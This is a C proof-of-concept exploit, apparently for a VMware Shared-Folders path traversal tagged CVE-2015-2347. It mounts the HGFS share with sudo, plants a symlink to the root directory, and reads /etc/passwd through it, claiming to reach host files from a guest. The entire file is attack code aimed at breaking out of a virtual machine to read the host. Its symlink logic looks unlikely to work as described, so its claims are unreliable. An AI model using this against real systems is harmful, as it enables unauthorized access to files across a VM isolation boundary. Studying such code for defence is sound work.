/*
 * C PoC for VMware Workstation/Player Shared-Folders path traversal
 * CVE-2015-2347
 *
 * Mounts the HGFS share via mount(2) and then exploits a symlink
 * to read an arbitrary host file from the guest.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SHARE_SRC    ".host:/shared"
#define SHARE_MOUNT  "/mnt/hgfs/shared"
#define TARGET_FILE  "/etc/passwd"
#define LINK_NAME    SHARE_MOUNT "/evilroot"

int main() {
    char buf[1024];
    int fd;

    // 1) Mount the shared folder if not already mounted
    if (system("mount | grep -q hgfs || "
               "sudo mount -t vmhgfs " SHARE_SRC " " SHARE_MOUNT) != 0) {
        perror("mount hgfs");
        return 1;
    }
    printf("[+] Mounted hgfs share at %s\n", SHARE_MOUNT);

    // 2) Create or overwrite the symlink inside the share
    unlink(LINK_NAME);  // ignore errors
    if (symlink("/", LINK_NAME) != 0) {
        perror("symlink");
        return 1;
    }
    printf("[+] Created symlink %s → /\n", LINK_NAME);

    // 3) Open and read the host file via the symlink
    char exploit_path[512];
    snprintf(exploit_path, sizeof(exploit_path),
             LINK_NAME "/%s", TARGET_FILE + 1);
    fd = open(exploit_path, O_RDONLY);
    if (fd < 0) {
        perror("open target");
        return 1;
    }
    printf("[+] Reading host file %s via %s\n", TARGET_FILE, exploit_path);

    // Dump first 1024 bytes
    ssize_t n = read(fd, buf, sizeof(buf)-1);
    if (n > 0) {
        buf[n] = 0;
        printf("%s\n", buf);
    }
    close(fd);
    return 0;
}